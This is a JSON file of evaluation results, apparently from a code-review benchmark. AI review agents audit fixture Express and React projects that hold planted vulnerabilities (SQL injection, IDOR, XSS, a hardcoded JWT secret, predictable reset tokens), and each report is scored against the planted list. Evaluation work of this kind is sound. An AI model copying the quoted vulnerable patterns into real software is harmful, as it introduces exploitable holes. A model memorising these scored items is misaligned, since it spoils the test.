@@ -1,0 +1,2108 @@
+{
+  "schema": 1,
+  "rounds": [
+    {
+      "label": "round 1 (prompts as committed before the evaluation)",
+      "date": "2026-10-17T13:24:47.404Z",
+      "claudeVersion": "2.1.296 (Claude Code)",
+      "calls": 12,
+      "stoppedBy": null,
+      "skipped": [],
+      "runs": [
+        {
+          "role": "rbe",
+          "fixture": "express-api",
+          "variant": "old",
+          "rep": 1,
+          "systemBytes": 2139,
+          "status": "ok",
+          "wallMs": 29251,
+          "report": "**Verdict: Do not ship.** I read all of `src/`, `db/schema.sql` and `package.json`. I did not run the code or tests, and I did not read `test/util.test.js`.\n\nThe project is Node/Express with Postgres, so I used the checklist directly. The fastapi, spring-boot and dpdp skills don't fit this stack. There is no `.env` file.\n\n## Critical\n1. **SQL injection** in `src/routes/products.js:19-21`. `/products/search` is unauthenticated and concatenates `q` into the SQL. Anyone can read the `users` table, including password hashes and reset tokens. Use `$1` with `'%' || $1 || '%'`, or pass the pattern as a parameter.\n2. **Order IDOR** in `src/routes/orders.js:19`. `GET /orders/:id` never checks `user_id`, so any logged-in user can read anyone's order, including `ship_to` (name and address). Add `AND user_id = $2`, and return 404 on a mismatch.\n3. **Password-reset account takeover** in `src/routes/auth.js:26`.\n   - The token comes from `Math.random()`, which is predictable.\n   - It is stored in plaintext. Combined with the SQL injection, an attacker could read it and take over any account.\n   - `/password-reset/confirm` has no password validation and no rate limit.\n   - Use `crypto.randomBytes(32)` and store a hash of the token.\n4. **Hardcoded JWT secret fallback** in `src/config.js:4`. If `JWT_SECRET` is unset, the app starts with a secret that is in the repo, so anyone can forge tokens. The DB credentials also default to `shop:shop`. Fail at startup if either is missing in production.\n\n## High\n5. **Stack traces returned to clients** in `src/server.js:17`. The error handler sends `err.message` and `err.stack`. This leaks internals and helps exploit the injection. Return a generic message and log the details server-side.\n6. **Order input is not validated** in `src/routes/orders.js:29-37`.\n   - `quantity` is never checked, so a negative or fractional value gives a negative or wrong total.\n   - A string quantity, a missing `productId` or a huge value is also accepted.\n   - The `items` array and `shipTo` have no size limit.\n   - Validate positive integers with an upper bound.\n7. **No rate limiting** on `/login` or the reset endpoints, so credential stuffing and token guessing are open. `/login` also reveals timing differences between unknown emails and wrong passwords, because bcrypt only runs when the user exists. Add `express-rate-limit`.\n8. **Reset endpoint behaviour** in `src/routes/auth.js:25-27`.\n   - It runs an UPDATE with whatever `email` is given, which could be undefined or an object.\n   - It generates tokens for every request, so a flood overwrites a real user's pending token.\n   - Validate that `email` is a string.\n   - Reset tokens are never cleared on login, and `reset_expires` isn't reset on confirm.\n\n## Medium\n9. **Order creation is not atomic or idempotent** in `src/routes/orders.js:32-37`. It makes one query per item (N+1). Prices are read and the order inserted with no transaction. Order items are not stored at all, because the schema has no `order_items` table, so the order can't be fulfilled or audited. A retry creates a duplicate order. Use one `WHERE id = ANY($1)` query, a transaction, an `order_items` table and an idempotency key.\n10. **Unbounded list** in `src/routes/orders.js:10`. `/orders` has no pagination. `/products/search` also has no `LIMIT`, and its `ILIKE '%…%'` scan has no index.\n11. **Weak server setup** in `src/server.js`.\n    - No `helmet`, no CORS policy, and no `express.json` body size limit set explicitly.\n    - There is no graceful shutdown or handling for unhandled rejections.\n    - The DB pool has no `error` handler or timeouts, so a dropped idle connection can crash the process.\n12. **Weak token handling** in `src/auth.js`.\n    - The JWT algorithm is not pinned in `verify`; pass `algorithms: ['HS256']`.\n    - A 12-hour token with no revocation is long.\n    - The email is embedded in the token.\n\n## Low\n- `price_cents INTEGER` and `total_cents` can overflow with large quantities.\n- The schema has no index on `orders(user_id)`.\n- `reset_token` has no index and no uniqueness.\n- The `lint` script only runs `node --check`, which is a syntax check and not real linting.\n- Express 4 doesn't catch async errors. The routes handle this correctly with `try/catch`, but it is easy to get wrong when new routes are added.\n\n## Personal data (DPDP)\nThe app collects email, password hash and shipping address, which are personal data. I found no consent, purpose notice, retention rule, or way to delete or export a user's data. `console.error(err)` may also log request data. I did not run the dpdp-compliance skill, so this is a surface check only.\n\n## Not checked\nDependency vulnerabilities (no `npm audit`; there is no lockfile in the repo), the tests, and deployment or infrastructure config such as TLS and secrets management.\n\n**Fix before shipping:** items 1–6, then 7–9.",
+          "tools": 12,
+          "toolNames": {
+            "Bash": 1,
+            "Glob": 1,
+            "Read": 10
+          },
+          "usage": {
+            "input_tokens": 8,
+            "cache_creation_input_tokens": 21720,
+            "cache_read_input_tokens": 67434,
+            "output_tokens": 3128,
+            "output_tokens_details": {
+              "thinking_tokens": 65
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 21720,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 1804,
+                "cache_read_input_tokens": 21631,
+                "cache_creation_input_tokens": 5017,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 5017
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 6,
+            "found": 6,
+            "recall": 1,
+            "looseFound": 6,
+            "looseRecall": 1,
+            "criticalHighPlanted": 4,
+            "criticalHighFound": 4,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "sql-injection-search",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "1. **SQL injection** in `src/routes/products.js:19-21`. `/products/search` is unauthenticated and concatenates `q` into the SQL. Anyone can read the `users` tab"
+              },
+              {
+                "id": "idor-order-by-id",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "2. **Order IDOR** in `src/routes/orders.js:19`. `GET /orders/:id` never checks `user_id`, so any logged-in user can read anyone's order, including `ship_to` (na"
+              },
+              {
+                "id": "hardcoded-jwt-secret",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "4. **Hardcoded JWT secret fallback** in `src/config.js:4`. If `JWT_SECRET` is unset, the app starts with a secret that is in the repo, so anyone can forge token"
+              },
+              {
+                "id": "login-no-rate-limit",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "near",
+                "foundTitle": "7. **No rate limiting** on `/login` or the reset endpoints, so credential stuffing and token guessing are open. `/login` also reveals timing differences between"
+              },
+              {
+                "id": "stack-trace-leak",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "5. **Stack traces returned to clients** in `src/server.js:17`. The error handler sends `err.message` and `err.stack`. This leaks internals and helps exploit the"
+              },
+              {
+                "id": "math-random-reset-token",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "3. **Password-reset account takeover** in `src/routes/auth.js:26`."
+              }
+            ],
+            "citations": {
+              "total": 9,
+              "valid": 9,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 4,
+              "ok": 4,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 6,
+              "exact": 1,
+              "over": 5,
+              "under": 0
+            },
+            "extraFindings": 11,
+            "extraTitles": [
+              "6. **Order input is not validated** in `src/routes/orders.js:29-37`.",
+              "8. **Reset endpoint behaviour** in `src/routes/auth.js:25-27`.",
+              "9. **Order creation is not atomic or idempotent** in `src/routes/orders.js:32-37`. It makes one query per item (N+1). Prices are read and the order inserted wit",
+              "10. **Unbounded list** in `src/routes/orders.js:10`. `/orders` has no pagination. `/products/search` also has no `LIMIT`, and its `ILIKE '%…%'` scan has no inde",
+              "11. **Weak server setup** in `src/server.js`.",
+              "12. **Weak token handling** in `src/auth.js`.",
+              "- `price_cents INTEGER` and `total_cents` can overflow with large quantities.",
+              "- The schema has no index on `orders(user_id)`.",
+              "- `reset_token` has no index and no uniqueness.",
+              "- The `lint` script only runs `node --check`, which is a syntax check and not real linting.",
+              "- Express 4 doesn't catch async errors. The routes handle this correctly with `try/catch`, but it is easy to get wrong when new routes are added."
+            ],
+            "infoFindings": 0,
+            "blocks": 17,
+            "format": {
+              "verdictFirstLine": false,
+              "rubricLabels": true,
+              "notChecked": false,
+              "compliant": false
+            }
+          },
+          "firstPass": {
+            "found": 0,
+            "planted": 6,
+            "blocks": 0,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rbe",
+          "fixture": "express-api",
+          "variant": "new",
+          "rep": 1,
+          "systemBytes": 13277,
+          "status": "ok",
+          "wallMs": 31297,
+          "report": "VERDICT: block\n\nTwo things block this: an unauthenticated SQL injection in product search, and a hard-coded fallback JWT secret that lets anyone forge tokens when `JWT_SECRET` is unset. I read all of `src/`, `db/schema.sql` and `package.json` by inspection. I did not run anything. `.env.example` was denied.\n\n[Critical] Unauthenticated SQL injection in product search — src/routes/products.js:19-21\nEvidence: `\"... WHERE name ILIKE '%\" + term + \"%' OR description ILIKE '%\" + term + \"%' ...\"`\nWhy it matters: `GET /products/search?q=` needs no login. `q` goes straight into the SQL, so an attacker can read the whole database (users, `password_hash`, `reset_token`). If a `reset_token` is read out, it takes over any account. Stacked queries may also be possible, depending on the driver.\nFix: `query(\"... WHERE name ILIKE $1 OR description ILIKE $1 ORDER BY name LIMIT 50\", ['%' + String(term) + '%'])`. Escape `%` and `_` in the term if literal matching matters.\n\n[Critical] Hard-coded fallback JWT secret — src/config.js:4\nEvidence: `jwtSecret: process.env.JWT_SECRET || 'shop-signing-key-placeholder-0000'` (the secret is in source control)\nWhy it matters: if `JWT_SECRET` is unset in any environment, anyone who reads the repo can sign a token with any `sub` and act as any user. Critical if production ever ran without the variable; I can't tell from the repo.\nFix: throw at startup when `JWT_SECRET` is missing, with no default. Rotate the secret in any environment that used the fallback. Also pass `{ algorithms: ['HS256'] }` to `jwt.verify` in src/auth.js:13.\n\n[High] Predictable password-reset tokens — src/routes/auth.js:26\nEvidence: `Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2)`\nWhy it matters: `Math.random` is not cryptographically secure, so tokens can be predicted. Combined with the `/password-reset/confirm` route, which has no rate limit, this allows account takeover.\nFix: `crypto.randomBytes(32).toString('hex')`. Store only a SHA-256 hash of the token in the database. Add rate limiting on the reset and login routes.\n\n[High] IDOR: any user can read any order — src/routes/orders.js:19\nEvidence: `SELECT id, user_id, status, total_cents, ship_to, created_at FROM orders WHERE id = $1` with `[req.params.id]`\nWhy it matters: ids are sequential integers, and `requireAuth` only checks that the caller is logged in. Any customer can read other customers' shipping addresses and totals.\nFix: add `AND user_id = $2` with `req.user.id`, and return 404 when nothing matches.\n\n[High] Order totals can be forged or corrupted — src/routes/orders.js:32-37\nEvidence: `total += rows[0].price_cents * item.quantity;`\nWhy it matters: `quantity` is never validated. A negative or fractional value reduces or zeroes the total, and a missing value gives `NaN`. Quantities and line items are not stored at all, because there is no `order_items` table. The loop also issues one query per item, and the writes are not in a transaction.\nFix: require `Number.isInteger(quantity) && quantity > 0` with an upper bound, cap the item count, fetch prices with `WHERE id = ANY($1)`, and persist the line items in one transaction.\n\n[Medium] Error handler leaks stack traces — src/server.js:17\nEvidence: `res.status(500).json({ error: err.message, stack: err.stack });`\nWhy it matters: clients see internals, including SQL errors that make injection easier to exploit.\nFix: return `{ error: 'Internal error' }` and log the detail server-side only.\n\n[Medium] Password reset issues four problems — src/routes/auth.js:23-45\nEvidence: `const { token, password } = req.body; const hash = await bcrypt.hash(password, 10);`\nWhy it matters:\n- Reset requests for the same email overwrite each other, so anyone can invalidate a user's pending reset.\n- `reset_expires` is not cleared after use.\n- A missing or non-string `password` makes bcrypt throw, which becomes a 500.\n- There is no password strength check.\nFix: validate input types, enforce a minimum password length, clear `reset_expires` on success, and rate-limit both routes.\n\n[Medium] No rate limiting or lockout on login and reset — src/routes/auth.js:8\nEvidence: no limiter middleware anywhere in src/server.js.\nWhy it matters: credentials and reset tokens can be brute-forced.\nFix: use `express-rate-limit` per IP and per account.\n\n[Low] No `helmet`, body size limit or CORS policy; unbounded order list — src/server.js:8, src/routes/orders.js:10\nEvidence: `app.use(express.json());` and no `LIMIT` on `GET /orders`.\nWhy it matters: weak hardening, and heavy users get ever-larger responses.\nFix: add `helmet`, `express.json({ limit: '100kb' })`, and pagination on `/orders`. Also add `CREATE INDEX ON orders (user_id)` and an index on `users (reset_token)` in the schema.\n\n[Low] Login-flow details — src/routes/auth.js:12-14\nEvidence: `WHERE email = $1`, then `bcrypt.compare` only if the user exists.\nWhy it matters: unknown emails return faster than known ones, so response timing reveals which emails are registered. Reset tokens are also stored in plaintext.\nFix: run a dummy `bcrypt.compare` for unknown users, and store only a hash of the reset token.\n\n[Info] Other\n- The `/password-reset` handler returns `ok` for unknown emails, which is correct.\n- Tokens last 12 hours with no revocation.\n- `pg` is used with parameters everywhere except the search route.\n- `test/util.test.js` covers only the helpers in `src/util.js`.\n\n## What I checked\n- All files in `src/`, `db/schema.sql`, and the `git ls-files` list.\n- Auth, JWT handling, SQL construction, error handling, and the order and reset flows.\n\n## What I did not check\n- `.env.example`: access to it was denied.\n- Dependency versions and CVEs: no network, and I did not read `package.json` closely.\n- Runtime behavior, the deployed configuration, whether production sets `JWT_SECRET`, and the actual database state.\n- Any mailer service that reads reset tokens.\n\n## Questions for the owner\n- Is `JWT_SECRET` set in every deployed environment? If it has ever been unset, the fallback-secret finding is exploitable now, and all tokens should be treated as compromised.",
+          "tools": 11,
+          "toolNames": {
+            "Bash": 1,
+            "Read": 10
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 24387,
+            "cache_read_input_tokens": 53922,
+            "output_tokens": 3527,
+            "output_tokens_details": {
+              "thinking_tokens": 0
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 24387,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2350,
+                "cache_read_input_tokens": 24579,
+                "cache_creation_input_tokens": 4736,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4736
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 6,
+            "found": 6,
+            "recall": 1,
+            "looseFound": 6,
+            "looseRecall": 1,
+            "criticalHighPlanted": 4,
+            "criticalHighFound": 4,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "sql-injection-search",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Unauthenticated SQL injection in product search — src/routes/products.js:19-21"
+              },
+              {
+                "id": "idor-order-by-id",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] IDOR: any user can read any order — src/routes/orders.js:19"
+              },
+              {
+                "id": "hardcoded-jwt-secret",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Hard-coded fallback JWT secret — src/config.js:4"
+              },
+              {
+                "id": "login-no-rate-limit",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] No rate limiting or lockout on login and reset — src/routes/auth.js:8"
+              },
+              {
+                "id": "stack-trace-leak",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Error handler leaks stack traces — src/server.js:17"
+              },
+              {
+                "id": "math-random-reset-token",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Predictable password-reset tokens — src/routes/auth.js:26"
+              }
+            ],
+            "citations": {
+              "total": 12,
+              "valid": 12,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 4,
+              "ok": 4,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 6,
+              "exact": 5,
+              "over": 1,
+              "under": 0
+            },
+            "extraFindings": 4,
+            "extraTitles": [
+              "[High] Order totals can be forged or corrupted — src/routes/orders.js:32-37",
+              "[Medium] Password reset issues four problems — src/routes/auth.js:23-45",
+              "[Low] No `helmet`, body size limit or CORS policy; unbounded order list — src/server.js:8, src/routes/orders.js:10",
+              "[Low] Login-flow details — src/routes/auth.js:12-14"
+            ],
+            "infoFindings": 1,
+            "blocks": 11,
+            "format": {
+              "verdictFirstLine": true,
+              "rubricLabels": true,
+              "notChecked": true,
+              "compliant": true
+            }
+          },
+          "firstPass": {
+            "found": 6,
+            "planted": 6,
+            "blocks": 11,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rfe",
+          "fixture": "react-app",
+          "variant": "old",
+          "rep": 1,
+          "systemBytes": 1992,
+          "status": "ok",
+          "wallMs": 26832,
+          "report": "**Verdict: Do not ship.** There are two Critical issues, and both are one-line fixes in `src/`. I read all the source files, `index.html`, `package.json` and `vite.config.ts`. I did not invoke the security-review or other skills, because they target pending diffs and the tree is clean.\n\n## Critical\n1. **Stored XSS.** `src/components/ArticleView.tsx:21` renders `article.bodyHtml` with `dangerouslySetInnerHTML` and no sanitisation. The token sits in `localStorage` (see High below), so any injected script can steal it. Sanitise with DOMPurify before rendering, or have the server return sanitised content or Markdown.\n2. **API key in the client bundle.** `src/api.ts:2` reads `VITE_NEWS_API_KEY`. Vite embeds every `VITE_*` variable in the shipped JS, so anyone can read the key. `src/api.ts:27` also puts it in the query string, where it ends up in logs and referrers. Move the key behind a backend proxy and rotate it if it has been used anywhere real. I did not read any `.env` file. The file list showed none.\n\n## High\n3. **Auth token in `localStorage`** (`src/api.ts:12`, `src/api.ts:23`). Any XSS can read it (see item 1). Prefer an httpOnly, Secure, SameSite cookie set by the server.\n4. **Interval leak and stale article** (`src/components/ArticleView.tsx:9-13`).\n   - `setInterval` is never cleared, so every mount adds another poller.\n   - The effect has an empty dependency array, so clicking \"Next article\" never fetches the new `id`.\n   - Responses can arrive out of order and overwrite a newer article.\n   - Fix: depend on `[id]`, return `clearInterval`, and use an `AbortController`.\n5. **Unsanitised `sourceUrl`** (`src/components/ArticleView.tsx:23`). A `javascript:` URL would be a link-click XSS. Allow only `http:` and `https:`. Also add `rel=\"noopener noreferrer\"` to the `target=\"_blank\"` link here and in `src/App.tsx:25`.\n6. **Login form has no accessible labels** (`src/components/LoginForm.tsx:21-22`). The inputs use placeholders only. Add `<label>` elements and `autocomplete=\"email\"` / `autocomplete=\"current-password\"`. The error `<p>` needs `role=\"alert\"`. The login error is also always \"Wrong email or password\", even for network failures.\n\n## Medium\n- **Missing `alt` on the logo** (`src/App.tsx:13`). Use `alt=\"\"` if it is decorative.\n- **Missing loading and error states** (`src/components/ArticleView.tsx:15-16`):\n  - The error never clears when `id` changes, so one failure sticks forever.\n  - A 401 never signs the user out.\n  - `Bearer null` is sent when there is no token (`src/api.ts:28`).\n  - There is no logout.\n  - `signedIn` is derived once from `localStorage`.\n- **Type safety:** `res.json()` is returned unvalidated as `Article`. `import.meta.env` values are cast with `as string` with no check that they are set.\n- **No CSP:** `index.html` has no Content-Security-Policy. Set one in the host's response headers.\n- **Whole lodash imported for one `truncate` call** (`src/format.ts:1`). This adds roughly 70 KB to the bundle. Use `lodash-es`/`lodash/truncate` or a small native helper.\n- **\"Next article\" button** has no disabled or loading state and no upper bound on `id`.\n\n## Low\n- **SEO:** `index.html` has no meta description. Article pages are client-rendered with a static title, so they are not indexable. That matters only if they are meant to be public.\n- **Tooling and tests:**\n  - `lint` uses `--ext`, which ESLint 9's flat config doesn't support, and no config file exists.\n  - `src/format.test.ts` covers only `format.ts`.\n  - No component tests exist.\n- **Font and image loading:** no fonts and no CSS files were found, so I couldn't check contrast or focus styles.\n\n## Not checked\n- Contrast and focus styling (there is no CSS in the repo).\n- Runtime behaviour. I did not build, run or test anything, because this tier is read-only.\n- Backend, CORS and cookie behaviour.\n- `src/format.test.ts` and `tsconfig.json` contents.\n- Dependency vulnerabilities (no audit run).",
+          "tools": 11,
+          "toolNames": {
+            "Bash": 1,
+            "Glob": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 8,
+            "cache_creation_input_tokens": 20344,
+            "cache_read_input_tokens": 67328,
+            "output_tokens": 2741,
+            "output_tokens_details": {
+              "thinking_tokens": 81
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 20344,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 1531,
+                "cache_read_input_tokens": 21553,
+                "cache_creation_input_tokens": 3719,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 3719
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 3,
+            "criticalHighFound": 3,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "html-injection-xss",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "1. **Stored XSS.** `src/components/ArticleView.tsx:21` renders `article.bodyHtml` with `dangerouslySetInnerHTML` and no sanitisation. The token sits in `localSt"
+              },
+              {
+                "id": "token-in-localstorage",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "3. **Auth token in `localStorage`** (`src/api.ts:12`, `src/api.ts:23`). Any XSS can read it (see item 1). Prefer an httpOnly, Secure, SameSite cookie set by the"
+              },
+              {
+                "id": "blank-without-rel",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "5. **Unsanitised `sourceUrl`** (`src/components/ArticleView.tsx:23`). A `javascript:` URL would be a link-click XSS. Allow only `http:` and `https:`. Also add `"
+              },
+              {
+                "id": "inputs-without-labels",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "6. **Login form has no accessible labels** (`src/components/LoginForm.tsx:21-22`). The inputs use placeholders only. Add `<label>` elements and `autocomplete=\"e"
+              },
+              {
+                "id": "img-without-alt",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "- **Missing `alt` on the logo** (`src/App.tsx:13`). Use `alt=\"\"` if it is decorative."
+              },
+              {
+                "id": "effect-missing-dependency",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "4. **Interval leak and stale article** (`src/components/ArticleView.tsx:9-13`)."
+              },
+              {
+                "id": "interval-never-cleared",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "4. **Interval leak and stale article** (`src/components/ArticleView.tsx:9-13`)."
+              },
+              {
+                "id": "whole-lodash-import",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "- **Whole lodash imported for one `truncate` call** (`src/format.ts:1`). This adds roughly 70 KB to the bundle. Use `lodash-es`/`lodash/truncate` or a small nat"
+              },
+              {
+                "id": "api-key-in-vite-env",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "2. **API key in the client bundle.** `src/api.ts:2` reads `VITE_NEWS_API_KEY`. Vite embeds every `VITE_*` variable in the shipped JS, so anyone can read the key"
+              }
+            ],
+            "citations": {
+              "total": 13,
+              "valid": 13,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 3,
+              "ok": 3,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 2,
+              "over": 7,
+              "under": 0
+            },
+            "extraFindings": 6,
+            "extraTitles": [
+              "- **Type safety:** `res.json()` is returned unvalidated as `Article`. `import.meta.env` values are cast with `as string` with no check that they are set.",
+              "- **No CSP:** `index.html` has no Content-Security-Policy. Set one in the host's response headers.",
+              "- **\"Next article\" button** has no disabled or loading state and no upper bound on `id`.",
+              "- **SEO:** `index.html` has no meta description. Article pages are client-rendered with a static title, so they are not indexable. That matters only if they are",
+              "- **Tooling and tests:**",
+              "- **Font and image loading:** no fonts and no CSS files were found, so I couldn't check contrast or focus styles."
+            ],
+            "infoFindings": 0,
+            "blocks": 15,
+            "format": {
+              "verdictFirstLine": false,
+              "rubricLabels": true,
+              "notChecked": false,
+              "compliant": false
+            }
+          },
+          "firstPass": {
+            "found": 0,
+            "planted": 9,
+            "blocks": 0,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rfe",
+          "fixture": "react-app",
+          "variant": "new",
+          "rep": 1,
+          "systemBytes": 13618,
+          "status": "ok",
+          "wallMs": 30264,
+          "report": "VERDICT: block\n\nThe article body is rendered as raw server HTML with no sanitising, and the auth token sits in `localStorage`. Together that is an XSS path to account takeover. The article effect also never cancels its interval and has a stale `id`.\n\n[Critical] Unsanitised server HTML is injected, and the token is stealable — src/components/ArticleView.tsx:21\nEvidence: `<div dangerouslySetInnerHTML={{ __html: article.bodyHtml }} />`; src/api.ts:23 `localStorage.setItem('token', data.token)`\nWhy it matters: any script in `bodyHtml` (a compromised or malicious article source) runs in the app's origin and can read the token from `localStorage`.\nFix: sanitise with `DOMPurify.sanitize(article.bodyHtml)`, or render Markdown with HTML off. Move the token to an httpOnly, SameSite cookie set by the server. I did not trace whether `bodyHtml` is attacker-influenced, because the server is not in this repo. It is Critical only if article content is not fully trusted.\n\n[High] The effect uses a stale `id`, and the interval is never cleared — src/components/ArticleView.tsx:9-13\nEvidence: `setInterval(load, 30000); }, []);`\nWhy it matters:\n- The deps array is `[]`, so \"Next article\" never refetches and the view stays on article 1.\n- The interval is never cleared, so each mount adds a poller, and Strict Mode doubles it. The polling keeps running after unmount and keeps setting state.\n- The interval always fetches the first `id` from the stale closure.\n- Without cancellation, a slow earlier response can overwrite a newer one.\nFix:\n```tsx\nuseEffect(() => {\n  const ac = new AbortController();\n  const load = () => fetchArticle(id, ac.signal).then(setArticle).catch(e => { if (e.name !== 'AbortError') setError(e.message); });\n  setArticle(null); setError(''); load();\n  const t = setInterval(load, 30000);\n  return () => { ac.abort(); clearInterval(t); };\n}, [id]);\n```\nAdd a `signal` parameter to `fetchArticle`.\n\n[Medium] A third-party key ships in the bundle and the URL — src/api.ts:2,27\nEvidence: `${API_URL}/articles/${id}?apikey=${NEWS_KEY}`\nWhy it matters: every `VITE_` variable is public, and this key ends up in the URL, server logs and the Referer header. That is fine only if it is a browser-scoped key. If it is a secret key, it must move behind a server proxy. I could not read `.env.example` (access denied), so I don't know which kind it is.\nFix: confirm the key is restricted to the app's origin or move the call server-side. Send the key in a header rather than the query string.\n\n[Medium] `sourceUrl` is unvalidated and `target=\"_blank\"` has no `rel` — src/components/ArticleView.tsx:23, src/App.tsx:25\nEvidence: `<a href={article.sourceUrl} target=\"_blank\">`\nWhy it matters: a `javascript:` URL from the API runs script when clicked. Without `rel=\"noopener\"`, older browsers let the opened page reach `window.opener`.\nFix: allow-list the scheme with `new URL(u).protocol === 'https:'` and add `rel=\"noopener noreferrer\"` to both links.\n\n[Medium] A stale token leaves the user stuck, and the failure message is wrong — src/App.tsx:7, src/api.ts:28, src/components/LoginForm.tsx:14\nEvidence: `Authorization: Bearer ${getToken()}`; `catch { setError('Wrong email or password') }`\nWhy it matters:\n- An expired token gives a 401 and \"Could not load article\" forever, with no route back to login.\n- Network and server errors during login are reported as \"Wrong email or password\".\n- There is no logout.\n- `data.token` is not checked before it is stored.\nFix: on a 401, clear the token and set `signedIn` to false. Show a distinct message for non-auth failures.\n\n[Medium] The login form is not accessible and can be submitted twice — src/components/LoginForm.tsx:21-24\nEvidence: `<input type=\"email\" placeholder=\"Email\" ...>`\nWhy it matters:\n- The inputs have no labels (placeholder only), and no `autocomplete` or `required`.\n- The error `<p>` is not announced to screen readers.\n- Double-clicking Sign in sends two requests, because there is no pending state.\nFix: add `<label>` elements, `autoComplete=\"email\"` and `\"current-password\"`, `role=\"alert\"` on the error, and a `submitting` flag that disables the button.\n\n[Low] The logo image has no `alt` — src/App.tsx:13\nFix: use `alt=\"\"` if the logo is decorative, otherwise `alt=\"News Reader\"`.\n\n[Low] Whole lodash import for one function — src/format.ts:1\nEvidence: `import _ from 'lodash'`\nWhy it matters: this pulls roughly 70 KB into the bundle for `truncate`.\nFix: use `import truncate from 'lodash/truncate'`, or a one-line native helper.\n\n[Low] No Content-Security-Policy and no meta description — index.html\nWhy it matters: there is no CSP in the repo, and it may be 